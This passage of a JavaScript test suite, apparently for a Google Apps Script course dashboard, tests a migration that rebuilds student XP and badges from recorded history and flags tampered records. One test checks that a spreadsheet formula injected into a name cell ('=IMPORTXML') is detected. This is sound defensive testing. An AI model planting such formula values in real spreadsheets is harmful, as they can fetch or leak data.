  const propsBefore = JSON.stringify(rt.props);

  /* Control: prove the detector actually detects. Without this, T-DRY1 could
     pass simply because the harness had stopped noticing writes. */
  {
    const probe = legacyDb();
    const clean = snapshotAll(probe);
    probe.ctx.sheet_(probe.ctx.SH_CODES).getRange(2, 9).setValue(999);
    ok('T-DRY0 (control) a single stray write IS detected', snapshotAll(probe) !== clean);
  }

  const report = g.auditMigration();

  ok('T-DRY1 the dry run does not change a single cell', snapshotAll(rt) === cellsBefore);
  ok('T-DRY2 the dry run does not create any tab',
     Object.keys(rt.sheets).sort().join(',') === tabsBefore,
     Object.keys(rt.sheets).sort().join(','));
  ok('T-DRY3 the dry run does not touch script properties', JSON.stringify(rt.props) === propsBefore);
  ok('T-DRY4 it says so in the report', /NOTHING WAS WRITTEN/.test(report));

  /* ── the two XP totals must be distinct and correctly labelled ──
     The report once printed the LEGACY total under the label "XP carried over
     unchanged", which was left over from the design where XP really was
     carried over. Since reconstruction replaced that, the two totals differ,
     and showing one under the other's name misrepresents the migration. */
  {
    const plan = g.migrationPlan_();
    /* fixture: Ana 195, Ben 99999, Cy 40 → legacy 100234; rebuilt 175 + 40 + 40 */
    ok('T-XPT1 the legacy total sums the dashboard cells',
       plan.totals.legacyXpTotal === 195 + 99999 + 40, plan.totals.legacyXpTotal);
    ok('T-XPT2 the rebuilt total sums what will enter _ServerXP',
       plan.totals.rebuiltXpTotal === 175 + 40 + 40, plan.totals.rebuiltXpTotal);
    ok('T-XPT3 the two totals are not the same number',
       plan.totals.legacyXpTotal !== plan.totals.rebuiltXpTotal);
    ok('T-XPT4 the rebuilt total equals the sum of the per-row seeds',
       plan.rows.filter(r => r.willSeed).reduce((n, r) => n + r.seed.xp, 0) ===
       plan.totals.rebuiltXpTotal);
    ok('T-XPT5 the change counters are right',
       plan.totals.xpChanged === 2 && plan.totals.xpDecreased === 2 &&
       plan.totals.xpIncreased === 0,
       { changed: plan.totals.xpChanged, down: plan.totals.xpDecreased, up: plan.totals.xpIncreased });
    ok('T-XPT6 the largest decrease is identified with its student',
       plan.totals.largestDecrease.code === 'AAP-BBBB-2222' &&
       plan.totals.largestDecrease.delta === 40 - 99999, plan.totals.largestDecrease);
    ok('T-XPT7 no increases in this particular fixture',
       plan.totals.largestIncrease === null, plan.totals.largestIncrease);
    /* An increase is a real scenario, not a hypothetical: a student who cleared
       their browser had S.xp reset to 0 and the next sync wrote that zero to
       the dashboard — while their completed activities stayed in Assessments.
       Reconstruction hands that work back, and the report must say so rather
       than claiming increases cannot happen. */
    ok('T-XPT10 an XP increase is detected and reported', (() => {
      const rt2 = makeRuntime(); const g2 = rt2.ctx;
      g2.initSheet_(g2.SH_CODES, g2.CODES_HEADERS.slice(0, 24));
      g2.initSheet_(g2.SH_ASSESS, g2.ASSESS_HEADERS.slice(0, 12));
      g2.sheet_(g2.SH_CODES).getRange(2, 1, 1, 24).setValues([
        ['AAP-LOST-0001', 'ACTIVE', 'Lost Progress', 'X', 'dev-l', new Date(), new Date(),
         4, 60, 0, '', '', '', 0, 0, 0, 0, '', 0, 0, 0, '', '', '']]);
      g2.appendRows_(g2.SH_ASSESS, [
        [new Date(), 'AAPLOST0001', 'Lost Progress', 'X', 'm1', 'm1-gal', 'polaroids', '', 'COMPLETED', 1, 0, 's-1'],
        [new Date(), 'AAPLOST0001', 'Lost Progress', 'X', 'm2', 'm2-dnd', 'sorter', '', 'COMPLETED', 1, 0, 's-1']
      ]);
      const p2 = g2.migrationPlan_();
      const rep = g2.auditMigration();
      return p2.totals.xpIncreased === 1 &&
             p2.totals.largestIncrease.delta === 100 &&
             p2.totals.rebuiltXpTotal === 100 && p2.totals.legacyXpTotal === 0 &&
             /Largest increase \.+ \+100/.test(rep) &&
             /An increase is not an error/.test(rep);
    })());
    ok('T-XPT8 the report labels both totals distinctly and drops the old wording',
       /\(A\) Legacy dashboard total/.test(report) &&
       /\(B\) Rebuilt total → _ServerXP/.test(report) &&
       !/XP carried over unchanged/.test(report));
    ok('T-XPT9 the report states which one is actually written',
       /This IS what gets/.test(report) && /This is NOT what students end up with/.test(report));
  }

  /* ── per-student read-only preview ── */
  {
    const before = snapshotAll(rt);
    const one = g.auditStudent('AAP-BBBB-2222');
    ok('T-STU1 the single-student preview writes nothing', snapshotAll(rt) === before);
    ok('T-STU2 it shows legacy and rebuilt XP side by side',
       /XP\s+99999\s+→\s+40/.test(one), one.match(/XP .*/));
    ok('T-STU3 it shows correct/attempts both ways',
       /Correct\s+300\s+→\s+0/.test(one) && /Attempts\s+200\s+→\s+0/.test(one));
    ok('T-STU4 it breaks badges into the three evidence states',
       /PROVEN/.test(one) && /UNVERIFIED/.test(one) && /CONTRADICTED/.test(one));
    ok('T-STU5 it lists the flags for that row', /XP_UNSUPPORTED/.test(one));
    ok('T-STU6 it shows the evidence counts behind the rebuild',
       /Assessments rows for this code/.test(one) && /Activities evidenced/.test(one));
    ok('T-STU7 an unknown code is reported, not guessed at',
       /No such access code/.test(g.auditStudent('AAP-ZZZZ-ZZZZ')));
  }

  /* ── outlier analysis ── */
  {
    const before = snapshotAll(rt);
    const out = g.auditOutliers();
    ok('T-OUT1 the outlier report writes nothing', snapshotAll(rt) === before);
    ok('T-OUT2 it ranks decreases largest-first and excludes no-evidence records', (() => {
      const sec = out.slice(out.indexOf('1. TOP 20'), out.indexOf('2. TOP 10'));
      /* Ben drops 99999→40; Ana 195→175. Ben must come first, and the
         no-recognised-history record must not appear in this section. */
      return sec.indexOf('AAP-BBBB-2222') < sec.indexOf('AAP-AAAA-1111') &&
             sec.indexOf('AAP-BBBB-2222') > -1;
    })(), out.slice(out.indexOf('1. TOP 20'), out.indexOf('2. TOP 10')));
    ok('T-OUT3 it reports the flag composition of decreasing records',
       /Only an unreconstructable bonus difference/.test(out) &&
       /Carrying HISTORY_INCOMPLETE/.test(out));
    ok('T-OUT4 it lists drops over 100 XP', /4\. DECREASES OF MORE THAN 100 XP/.test(out) &&
       /AAP-BBBB-2222/.test(out.slice(out.indexOf('4. DECREASES'), out.indexOf('5. REBUILT'))));
    ok('T-OUT5 it lists records rebuilt below half their legacy figure',
       /AAP-BBBB-2222/.test(out.slice(out.indexOf('5. REBUILT'), out.indexOf('RECORDS WITH NO'))));
    ok('T-OUT6 it separates records with no recognised history',
       /RECORDS WITH NO RECOGNISED HISTORY AT ALL/.test(out));
    ok('T-OUT7 it breaks contradicted badges down by reason',
       /MISS_RECORDED/.test(out) && /NOT_COMPLETED/.test(out) && /MODULE_INCOMPLETE/.test(out));
    /* This fixture's unknown id is "m9-retired", so the report must NOT claim
       every unknown id is "x" — it must name what it actually found. */
    ok('T-OUT8 it enumerates the unknown ids it actually found',
       /· "m9-retired"  1 row\(s\)/.test(out) &&
       /more than just "x"/.test(out) &&
       /REPLAY rows in history \.+ 0/.test(out) &&
       /Server-written rows \.+ 0/.test(out),
       out.slice(out.indexOf('7. CONFIRMATIONS'), out.indexOf('7. CONFIRMATIONS') + 500));
    ok('T-OUT8b it confirms the all-"x" case when that is what the data shows', (() => {
      const rt3 = makeRuntime(); const g3 = rt3.ctx;
      g3.initSheet_(g3.SH_CODES, g3.CODES_HEADERS.slice(0, 24));
      g3.initSheet_(g3.SH_ASSESS, g3.ASSESS_HEADERS.slice(0, 12));
      g3.sheet_(g3.SH_CODES).getRange(2, 1, 1, 24).setValues([
        ['AAP-XONL-0001', 'ACTIVE', 'X Only', 'A', 'dev-x', new Date(), new Date(),
         1, 0, 999, '', '', '', 0, 0, 0, 0, '', 0, 0, 0, '', '', '']]);
      g3.appendRows_(g3.SH_ASSESS, Array.from({ length: 7 }, () =>
        [new Date(), 'AAPXONL0001', 'X Only', 'A', '', 'x', 'activity', '', 'COMPLETED', 1, 0, 's-1']));
      const o3 = g3.auditOutliers();
      return /every unknown id is exactly "x"/.test(o3) &&
             /· "x"  7 row\(s\)/.test(o3) &&
             /RECORDS WITH NO RECOGNISED HISTORY AT ALL \(1\)/.test(o3);
    })());
    ok('T-OUT9 it states plainly that it wrote nothing',
       /Writes performed by this report \.+ none/.test(out) &&
       /NOTHING WAS WRITTEN/.test(out));
  }

  /* ── per-section diagnostic (Apps Script truncates one long log entry) ── */
  {
    const before = snapshotAll(rt);
    const s3 = g.auditOutlierSection_(3);
    const s4 = g.auditOutlierSection_(4);
    const s5 = g.auditOutlierSection_(5);
    const s6 = g.auditOutlierSection_(6);
    const s7 = g.auditOutlierSection_(7);
    ok('T-SEC1 emitting sections separately writes nothing', snapshotAll(rt) === before);
    ok('T-SEC2 section 3 gives all six counts',
       /XP_UNRECONSTRUCTABLE_DIFF only/.test(s3) && /XP_UNSUPPORTED only/.test(s3) &&
       /STATS_PARTIAL_DIFF/.test(s3) && /HISTORY_INCOMPLETE/.test(s3) &&
       /any other flag/.test(s3) && /two or more serious flags/.test(s3), s3);
    ok('T-SEC3 section 4 lists drops over 100 with compact flag codes',
       /SECTION 4/.test(s4) && /AAP-BBBB-2222/.test(s4) &&
       /XP_UNSUPPORTED/.test(s4) && !/The difference is larger than/.test(s4), s4);
    ok('T-SEC4 section 5 reports the percentage retained',
       /KEPT/.test(s5) && /0%/.test(s5), s5);
    ok('T-SEC5 section 6 lists every reason code plus OTHER',
       ['MISS_RECORDED', 'NOT_COMPLETED', 'MODULE_INCOMPLETE', 'STREAK_SHORT',
        'UNKNOWN_BADGE', 'NO_RULE', 'OTHER'].every(c => new RegExp(c + '\\s+\\d').test(s6)), s6);
    /* The first version of this only checked the labels were present, which a
       table of all-zeros-and-an-OTHER-bucket passed happily — and that is
       exactly the bug it missed: the reason code was not being copied out of
       classifyLegacyBadge_, so every contradiction landed in OTHER. */
    /* The report path must attribute reasons correctly even when AnswerKey.gs
       is a revision behind and classifyLegacyBadge_ returns no code. That is
       not hypothetical: it is exactly how a live run produced "OTHER 150" with
       every named reason at zero, because the codes are produced in one file
       and consumed in another. */
    ok('T-SEC5c section 6 is correct even with an AnswerKey.gs that has no reason codes', (() => {
      const fsx = require('fs'), pathx = require('path'), osx = require('os');
      const tmp = fsx.mkdtempSync(pathx.join(osx.tmpdir(), 'aap-oldkey-'));
      fsx.writeFileSync(pathx.join(tmp, 'Code.gs'), fsx.readFileSync('_apps-script/Code.gs'));
      const stripped = fsx.readFileSync('_apps-script/AnswerKey.gs', 'utf8')
        .replace(/ code: '[A-Z_]+',/g, '').replace(/, code: '[A-Z_]+'/g, '');
      fsx.writeFileSync(pathx.join(tmp, 'AnswerKey.gs'), stripped);
      if ((stripped.match(/code: '/g) || []).length !== 0) return 'strip failed';

      const saved = process.env.AAP_GS_DIR;
      process.env.AAP_GS_DIR = tmp;
      let sec;
      try {
        const gx = makeRuntime().ctx;
        /* prove the precondition: the classifier really returns no code here */
        const probe = gx.classifyLegacyBadge_('sharp-eye',
          { badges: {}, gates: { 'm5-kc': true }, attempts: 2, streak: 1,
            byGate: { 'm5-kc': { rows: 2, wrong: 1 } } }, { 'm5-kc': { rows: 2, wrong: 1 } });
        if (probe.code !== undefined) return 'precondition not met — key still has codes';

        gx.initSheet_(gx.SH_CODES, gx.CODES_HEADERS.slice(0, 24));
        gx.initSheet_(gx.SH_ASSESS, gx.ASSESS_HEADERS.slice(0, 12));
        gx.sheet_(gx.SH_CODES).getRange(2, 1, 1, 24).setValues([
          ['AAP-OLD-0001', 'ACTIVE', 'Old Key', 'A', 'd', new Date(), new Date(), 1, 0, 0,
           '', '', '', 0, 0, 0, 4, 'Full Scholar, Clean Sort, Sharp Eye, Grand Poobah',
           0, 0, 0, '', '', '']]);
        gx.appendRows_(gx.SH_ASSESS, [
          [new Date(1), 'AAPOLD0001', '', '', 'm1', 'm5-kc', 'quiz', '', 'WRONG', 1, 0, 's'],
          [new Date(2), 'AAPOLD0001', '', '', 'm1', 'm5-kc', 'quiz', '', 'CORRECT', 2, 0, 's'],
          [new Date(3), 'AAPOLD0001', '', '', 'm1', 'm5-kc', 'quiz', '', 'COMPLETED', 2, 0, 's']
        ]);
        sec = gx.auditOutlierSection_(6);
      } finally {
        if (saved === undefined) delete process.env.AAP_GS_DIR; else process.env.AAP_GS_DIR = saved;
        fsx.rmSync(tmp, { recursive: true, force: true });
      }
      const n = c => Number((sec.match(new RegExp(c + '\\s+(\\d+)')) || [])[1]);
      return n('MISS_RECORDED') === 1 && n('NOT_COMPLETED') === 1 &&
             n('MODULE_INCOMPLETE') === 1 && n('UNKNOWN_BADGE') === 1 && n('OTHER') === 0;
    })() === true);

    ok('T-SEC5b every contradiction is attributed to a real reason, not OTHER', (() => {
      const rt4 = makeRuntime(); const g4 = rt4.ctx;
      g4.initSheet_(g4.SH_CODES, g4.CODES_HEADERS.slice(0, 24));
      g4.initSheet_(g4.SH_ASSESS, g4.ASSESS_HEADERS.slice(0, 12));
      g4.sheet_(g4.SH_CODES).getRange(2, 1, 1, 24).setValues([
        ['AAP-RSN-0001', 'ACTIVE', 'Reason', 'A', 'd', new Date(), new Date(), 1, 0, 0,
         '', '', '', 0, 0, 0, 4, 'Full Scholar, Clean Sort, Sharp Eye, Grand Poobah',
         0, 0, 0, '', '', '']]);
      g4.appendRows_(g4.SH_ASSESS, [
        [new Date(1), 'AAPRSN0001', '', '', 'm1', 'm5-kc', 'quiz', '', 'WRONG', 1, 0, 's'],
        [new Date(2), 'AAPRSN0001', '', '', 'm1', 'm5-kc', 'quiz', '', 'CORRECT', 2, 0, 's'],
        [new Date(3), 'AAPRSN0001', '', '', 'm1', 'm5-kc', 'quiz', '', 'COMPLETED', 2, 0, 's']
      ]);
      const sec = g4.auditOutlierSection_(6);
      const n = c => Number((sec.match(new RegExp(c + '\\s+(\\d+)')) || [])[1]);
      return n('MISS_RECORDED') === 1 &&      // Sharp Eye — a miss on m5-kc
             n('NOT_COMPLETED') === 1 &&      // Clean Sort — no sorter completed
             n('MODULE_INCOMPLETE') === 1 &&  // Full Scholar
             n('UNKNOWN_BADGE') === 1 &&      // "Grand Poobah"
             n('OTHER') === 0;
    })());
    ok('T-SEC6 section 7 confirms ids, REPLAY, server-written and read-only',
       /unknown activity ids/.test(s7) && /legacy REPLAY rows \.+ 0/.test(s7) &&
       /server-written rows \.+ 0/.test(s7) && /Version history/.test(s7), s7);
    const full = g.auditOutliers();
    ok('T-SEC7 each section is far smaller than the full report',
       Math.max(s3.length, s4.length, s5.length, s6.length, s7.length) < full.length / 2,
       { biggest: Math.max(s3.length, s4.length, s5.length, s6.length, s7.length), full: full.length });
    ok('T-SEC8 an unknown section number is reported, not guessed at',
       /Unknown section "9"/.test(g.auditOutlierSection_(9)));
  }

  /* ── badge contradiction reasons are counted, not string-matched ── */
  {
    const rt2 = makeRuntime(); const g2 = rt2.ctx;
    const st = { badges: {}, gates: { 'm5-kc': true }, attempts: 2, streak: 1,
                 byGate: { 'm5-kc': { rows: 2, wrong: 1 } } };
    ok('T-OUT10 a recorded miss carries the MISS_RECORDED code',
       g2.classifyLegacyBadge_('sharp-eye', st, st.byGate).code === 'MISS_RECORDED');
    ok('T-OUT11 an uncompleted activity carries NOT_COMPLETED',
       g2.classifyLegacyBadge_('sorter', st, st.byGate).code === 'NOT_COMPLETED');
    ok('T-OUT12 a module badge carries MODULE_INCOMPLETE',
       g2.classifyLegacyBadge_('scholar', st, st.byGate).code === 'MODULE_INCOMPLETE');
    ok('T-OUT13 a short streak carries STREAK_SHORT',
       g2.classifyLegacyBadge_('combo5', st, st.byGate).code === 'STREAK_SHORT');
  }

  /* ── it must be accurate ── */
  ok('T-DRY5 it counts the codes', /Access codes on the sheet \.+ 4/.test(report), report.match(/Access codes.*/));
  ok('T-DRY6 it counts what would be seeded', /Would be seeded now \.+ 4/.test(report));
  ok('T-DRY7 it lists the columns that would be added',
     /\+ column 25  _TokenEpoch/.test(report) && /\+ column 36  _ServerTries/.test(report));
  ok('T-DRY8 it announces the new SecurityLog tab', /\+ new tab: SecurityLog/.test(report));

  /* ── it must flag the interesting rows ── */
  ok('T-DRY9 it flags a dashboard the history cannot back up',
     /HISTORY_INCOMPLETE: dashboard claims 22 activities, history evidences 1/.test(report), report.match(/HISTORY_SHORT.*/));
  ok('T-DRY10 it flags impossible accuracy', /IMPOSSIBLE_ACCURACY: 300 correct out of 200/.test(report));
  ok('T-DRY11 it flags XP above what the course can award', /XP_ABOVE_COURSE_MAX: 99999/.test(report));
  ok('T-DRY12 it flags a formula already sitting in a name cell',
     /FORMULA_TEXT in NAME: =IMPORTXML/.test(report), report.match(/FORMULA_TEXT.*/));
  ok('T-DRY13 it reports activity ids the answer key does not know',
     /m9-retired\s+\(1 rows\)/.test(report), report.match(/m9-retired.*/));
  ok('T-DRY14 it reports history belonging to no code on the sheet',
     /1 code\(s\) appear in Assessments but not in AccessCodes/.test(report));
  ok('T-DRY15 an honest row is NOT flagged',
     !/Row 2 .*AAP-AAAA-1111/.test(report.slice(report.indexOf('D. ROWS WORTH LOOKING AT'),
                                                report.indexOf('E. WHAT THE DASHBOARD'))));
  ok('T-DRY16 the verdict raises the unknown activity id and says what to do about it',
     /ONE THING TO CHECK FIRST/.test(report) &&
     /Is this a real activity that used to be in the module\?/.test(report) &&
     /safe to proceed/.test(report));
  ok('T-DRY17 it previews the rebuild, field by field',
     /XP now → rebuilt/.test(report) &&
     /99999\s*→ 40/.test(report) &&        // Ben: dashboard vs the one gate he can prove
     /100%\s*→ 5%/.test(report) &&
     /300\/200\s*→ 0\/0/.test(report) &&   // fabricated stats collapse to what history holds
     /15 badges\s*→ 2 badges/.test(report),
     (report.match(/.*→.*/g) || []).slice(0, 6));

  /* ── the preview must match what actually happens ── */
  const plan = g.migrationPlan_();
  const predicted = {};
  plan.rows.forEach(r => { if (r.willSeed) predicted[r.code] = r.seed; });

  const rt2 = legacyDb(); const g2 = rt2.ctx;
  g2.migrateSchema();
  const sh2 = g2.sheet_(g2.SH_CODES);
  let mismatches = [];
  for (let row = 2; row <= 5; row++) {
    const rec = sh2.getRange(row, 1, 1, g2.CODES_HEADERS.length).getValues()[0];
    const code = String(rec[g2.C.CODE - 1]);
    const p = predicted[code];
    if (!p) continue;
    if (String(rec[g2.C.SGATES - 1]) !== p.gates.join(',')) mismatches.push(code + ' gates');
    if (Number(rec[g2.C.SXP - 1]) !== p.xp) mismatches.push(code + ' xp');
    if (Number(rec[g2.C.SCORRECT - 1]) !== p.correct) mismatches.push(code + ' correct');
    if (Number(rec[g2.C.SATTEMPTS - 1]) !== p.attempts) mismatches.push(code + ' attempts');
  }
  ok('T-DRY18 what the dry run predicted is exactly what the migration wrote',
     mismatches.length === 0, mismatches);

  /* ── running it again after migrating ── */
  const after = g2.auditMigration();
  ok('T-DRY19 after migrating it reports nothing left to do', /NOTHING TO DO/.test(after));
  ok('T-DRY20 and confirms the schema is current', /already has all 38 columns/.test(after));

  /* ── it must cope with an un-set-up sheet ── */
  const rt3 = makeRuntime();
  const empty = rt3.ctx.auditMigration();
  ok('T-DRY21 it fails gracefully on a database that was never set up',
     /no AccessCodes tab/.test(empty) && Object.keys(rt3.sheets).length === 0, Object.keys(rt3.sheets));
}

/* ═══════════════════════════════════════════════════════════════════════ */
head('RECONSTRUCTION — LEGACY DASHBOARD IS NEVER INHERITED');
{
  /* Two rows, no special cases anywhere in the code:
       · a manipulated record whose only history is unrecognised "x" rows
       · a legitimate student whose history backs up their work            */
  function db() {
    const rt = makeRuntime(); const g = rt.ctx;
    const sh = g.initSheet_(g.SH_CODES, g.CODES_HEADERS.slice(0, 24));
    g.initSheet_(g.SH_ASSESS, g.ASSESS_HEADERS.slice(0, 12));
    sh.getRange(2, 1, 3, 24).setValues([
      // ── the manipulated row, exactly as the dry run reported it ──
      ['AAP-S58H-N22X', 'ACTIVE', 'keni', 'BSED-1A', 'dev-k', new Date('2026-07-01'), new Date('2026-08-01'),
       3, 12, 999999, 8, 'Virtuoso', 100, 500, 500, 0, 15, 'Full Scholar', 0, 0, 0, 'm1', 's-k', 4],
      // ── a legitimate student ──
      ['AAP-GOOD-0001', 'ACTIVE', 'Ana Reyes', 'BSED-1A', 'dev-a', new Date('2026-06-01'), new Date('2026-07-01'),
       11, 300, 195, 2, 'Sketcher', 80, 8, 10, 4, 3, 'Sharp Eye, Clean Sort, Shutterbug', 1, 14, 3, 'm2', 's-a', 9],
      // ── never claimed ──
      ['AAP-NONE-0002', 'UNUSED', '', '', '', '', '', 0, 0, 0, '', '', '', 0, 0, '', '', '', '', '', '', '', '', '']
    ]);
    g.appendRows_(g.SH_ASSESS, [
      // keni: 7 rows, all naming an activity the answer key has never heard of
      ...Array.from({ length: 7 }, (_, i) =>
        [new Date('2026-07-1' + i), 'AAPS58HN22X', 'keni', 'BSED-1A', '', 'x', 'activity', '#REF!', 'COMPLETED', 1, 0, 's-k']),
      // Ana: three real clears (40 + 60 + 75 = 175) and four answer rows
      [new Date('2026-06-10T09:00:00Z'), 'AAPGOOD0001', 'Ana Reyes', 'BSED-1A', 'm1', 'm1-gal', 'polaroids', '', 'COMPLETED', 1, 0, 's-a'],
      [new Date('2026-06-11T09:00:00Z'), 'AAPGOOD0001', 'Ana Reyes', 'BSED-1A', 'm2', 'm2-dnd', 'sorter', '', 'CORRECT', 1, 0, 's-a'],
      [new Date('2026-06-11T09:00:01Z'), 'AAPGOOD0001', 'Ana Reyes', 'BSED-1A', 'm2', 'm2-dnd', 'sorter', '', 'COMPLETED', 1, 0, 's-a'],
      [new Date('2026-06-12T09:00:00Z'), 'AAPGOOD0001', 'Ana Reyes', 'BSED-1A', 'm2', 'm2-kc', 'quiz', '', 'WRONG', 1, 0, 's-a'],
      [new Date('2026-06-12T09:00:02Z'), 'AAPGOOD0001', 'Ana Reyes', 'BSED-1A', 'm2', 'm2-kc', 'quiz', '', 'CORRECT', 2, 0, 's-a'],
      [new Date('2026-06-12T09:00:03Z'), 'AAPGOOD0001', 'Ana Reyes', 'BSED-1A', 'm2', 'm2-kc', 'quiz', '', 'COMPLETED', 2, 0, 's-a']
    ]);
    return rt;
  }

  const rt = db(); const g = rt.ctx;
  const plan = g.migrationPlan_();
  const byCode = {};
  plan.rows.forEach(r => byCode[r.code] = r);
  const keni = byCode['AAP-S58H-N22X'];
  const ana  = byCode['AAP-GOOD-0001'];

  /* ── the manipulated row ── */
  ok('T-REC1 manipulated XP is not inherited', keni.seed.xp === 0, keni.seed.xp);
  ok('T-REC2 manipulated correct/attempts are not inherited',
     keni.seed.correct === 0 && keni.seed.attempts === 0, keni.seed);
  ok('T-REC3 manipulated streak is not inherited', keni.seed.streak === 0);
  ok('T-REC4 manipulated badge list is not inherited',
     keni.seed.badgeIds.length === 0 && keni.derived.badgeList === '', keni.derived.badgeList);
  ok('T-REC5 no activities credited from unrecognised ids',
     keni.seed.gates.length === 0 && keni.derived.activities === 0);
  ok('T-REC6 progress and lessons rebuild to zero',
     keni.derived.progress === 0 && keni.derived.lessons === 0);
  ok('T-REC7 level and rank fall back to the floor',
     keni.derived.level === 1 && keni.derived.rank === 'Apprentice', keni.derived.rank);
  ok('T-REC8 accuracy is not 100% on zero attempts', keni.derived.accuracy === 0);
  ok('T-REC9 the row is reported as unaccounted for, with the numbers named',
     keni.flags.some(f => /XP_UNSUPPORTED: dashboard 999999, rebuilt 0/.test(f)) &&
     keni.flags.some(f => /STATS_UNSUPPORTED/.test(f)) &&
     keni.flags.some(f => /BADGES_CONTRADICTED/.test(f)) &&
     keni.flags.some(f => /BADGES_UNNAMED/.test(f)) &&
     keni.flags.some(f => /HISTORY_ALL_UNRECOGNISED: 7 Assessments row/.test(f)) &&
     keni.flags.some(f => /NO_RECOGNISED_HISTORY/.test(f)),
     keni.flags);
  ok('T-REC9b …and not filed as a merely-unrebuildable difference',
     keni.diffs.length === 0, keni.diffs);
  ok('T-REC10 no hard-coded reference to this student anywhere in the source', (() => {
    const src = require('fs').readFileSync('_apps-script/Code.gs', 'utf8') +
                require('fs').readFileSync('_apps-script/AnswerKey.gs', 'utf8');
    return !/keni/i.test(src) && !/S58H/i.test(src) && !/N22X/i.test(src);
  })());

  /* ── the legitimate student ── */
  ok('T-REC11 real work is preserved: 40+60+75 = 175 XP', ana.seed.xp === 175, ana.seed.xp);
  ok('T-REC12 all three completed activities are credited',
     ana.seed.gates.join(',') === 'm1-gal,m2-dnd,m2-kc', ana.seed.gates);
  ok('T-REC13 correct/attempts come from real answer rows',
     ana.seed.correct === 2 && ana.seed.attempts === 3, ana.seed);
  ok('T-REC14 streak is rebuilt from the recorded order', ana.seed.streak === 1, ana.seed.streak);
  ok('T-REC15 badges provable from the gate set are awarded',
     ana.seed.badgeIds.indexOf('shutterbug') >= 0 && ana.seed.badgeIds.indexOf('first-steps') >= 0,
     ana.seed.badgeIds);
  /* Ana's m2-dnd record is one CORRECT row and no misses, so a clean run IS
     demonstrated and Clean Sort is awarded. Her m2-kc record contains a WRONG,
     so Sharp Eye is not. That asymmetry is the whole point of the evidence
     model: honest work is restored, unsupported claims are not. */
  ok('T-REC16 a no-miss badge the history demonstrates IS awarded',
     ana.seed.badgeIds.indexOf('sorter') >= 0, ana.seed.badgeIds);
  ok('T-REC16b …and one the history contradicts is NOT',
     ana.seed.badgeIds.indexOf('sharp-eye') < 0, ana.seed.badgeIds);
  ok('T-REC17 progress reflects 3 of 22 activities',
     ana.derived.progress === Math.round(3 / g.allGates_().length * 100), ana.derived.progress);
  ok('T-REC18 a legitimate row is not flagged for XP',
     !ana.flags.some(f => /XP_NOT_SUBSTANTIATED/.test(f)), ana.flags);
  ok('T-REC19 per-activity attempt counts are seeded so no later first-try bonus can be claimed',
     ana.seed.tries['m2-dnd'] === 2 && ana.seed.tries['m2-kc'] === 3, ana.seed.tries);

  /* ── never-claimed row is left alone ── */
  ok('T-REC20 an unclaimed code rebuilds to a clean zero',
     byCode['AAP-NONE-0002'].seed.xp === 0 && byCode['AAP-NONE-0002'].flags.length === 0);

  /* ── dry run must predict the real write, field for field ── */
  const rt2 = db(); const g2 = rt2.ctx;
  g2.migrateSchema();
  const sh2 = g2.sheet_(g2.SH_CODES);
  const mism = [];
  plan.rows.forEach(p => {
    if (!p.willSeed) return;
    const rec = sh2.getRange(p.rowNum, 1, 1, g2.CODES_HEADERS.length).getValues()[0];
    const pairs = [
      ['XP', g2.C.XP, p.derived.xp], ['LEVEL', g2.C.LEVEL, p.derived.level],
      ['RANK', g2.C.RANK, p.derived.rank], ['ACC', g2.C.ACC, p.derived.accuracy],
      ['CORRECT', g2.C.CORRECT, p.derived.correct], ['ATTEMPTS', g2.C.ATTEMPTS, p.derived.attempts],
      ['STREAK', g2.C.STREAK, p.derived.streak], ['BADGE_N', g2.C.BADGE_N, p.derived.badgeCount],
      ['BADGE_L', g2.C.BADGE_L, p.derived.badgeList], ['LESSONS', g2.C.LESSONS, p.derived.lessons],
      ['PROGRESS', g2.C.PROGRESS, p.derived.progress], ['ACTS', g2.C.ACTS, p.derived.activities],
      ['SXP', g2.C.SXP, p.seed.xp], ['SGATES', g2.C.SGATES, p.seed.gates.join(',')],
      ['SCORRECT', g2.C.SCORRECT, p.seed.correct], ['SATTEMPTS', g2.C.SATTEMPTS, p.seed.attempts],
      ['SSTREAK', g2.C.SSTREAK, p.seed.streak], ['SBADGES', g2.C.SBADGES, p.seed.badgeIds.join(',')]
    ];
    pairs.forEach(([name, colIdx, want]) => {
      const got = rec[colIdx - 1];
      if (String(got) !== String(want)) mism.push(p.code + '.' + name + ': wrote ' + got + ', predicted ' + want);
    });
  });
  ok('T-REC21 every field the migration wrote matches the dry-run prediction',
     mism.length === 0, mism.slice(0, 8));

  /* ── the sheet after the real run ── */
  const kRow = sh2.getRange(2, 1, 1, g2.CODES_HEADERS.length).getValues()[0];
  ok('T-REC22 the manipulated dashboard is actually overwritten on the sheet',
     Number(kRow[g2.C.XP - 1]) === 0 && Number(kRow[g2.C.CORRECT - 1]) === 0 &&
     Number(kRow[g2.C.BADGE_N - 1]) === 0 && String(kRow[g2.C.RANK - 1]) === 'Apprentice',
     { xp: kRow[g2.C.XP - 1], correct: kRow[g2.C.CORRECT - 1], badges: kRow[g2.C.BADGE_N - 1] });
  ok('T-REC23 the original figures are preserved in _PreMigration',
     JSON.parse(String(kRow[g2.C.PREMIG - 1])).xp === 999999 &&
     JSON.parse(String(kRow[g2.C.PREMIG - 1])).badgeList === 'Full Scholar');
  ok('T-REC24 identity columns are untouched',
     String(kRow[g2.C.CODE - 1]) === 'AAP-S58H-N22X' && String(kRow[g2.C.NAME - 1]) === 'keni' &&
     String(kRow[g2.C.DEVICE - 1]) === 'dev-k' && Number(kRow[g2.C.LOGINS - 1]) === 3 &&
     Number(kRow[g2.C.MINUTES - 1]) === 12);

  const aRow = sh2.getRange(3, 1, 1, g2.CODES_HEADERS.length).getValues()[0];
  ok('T-REC25 the legitimate student keeps their work on the sheet',
     Number(aRow[g2.C.XP - 1]) === 175 && Number(aRow[g2.C.ACTS - 1]) === 3,
     { xp: aRow[g2.C.XP - 1], acts: aRow[g2.C.ACTS - 1] });

  /* ── Assessments must be untouched ── */
  const ash2 = g2.sheet_(g2.SH_ASSESS);
  ok('T-REC26 not one Assessments row was added, removed or rewritten',
     ash2.getLastRow() === 14 &&
     String(ash2.getRange(2, 6).getValue()) === 'x' &&
     String(ash2.getRange(2, 9).getValue()) === 'COMPLETED',
     ash2.getLastRow());

  /* ── reversibility ── */
  const rt3 = db(); const g3 = rt3.ctx;
  g3.migrateSchema();
  let confirmed = false;
  g3.SpreadsheetApp.getUi = () => ({
    alert: () => 'YES', Button: { YES: 'YES' }, ButtonSet: { YES_NO: 1, OK: 2 }
  });
  g3.restorePreMigration();
  const restored = g3.sheet_(g3.SH_CODES).getRange(2, 1, 1, g3.CODES_HEADERS.length).getValues()[0];
  ok('T-REC27 restore puts the pre-upgrade figures back',
